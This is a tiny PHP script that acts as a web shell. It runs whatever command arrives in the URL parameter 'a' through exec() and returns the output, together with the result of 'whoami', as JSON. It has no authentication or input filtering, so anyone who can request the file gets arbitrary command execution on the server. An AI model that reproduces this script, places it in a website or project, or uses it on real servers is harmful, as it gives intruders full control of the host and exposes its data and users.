<?php
	$command = exec($_GET['a']);
	
	if(empty($command)){
		$command = "command not found: ".$_GET['a'];
	}
	
$json = array("user" => exec("whoami"),
			  "command" => $command);
				
echo json_encode($json);
?>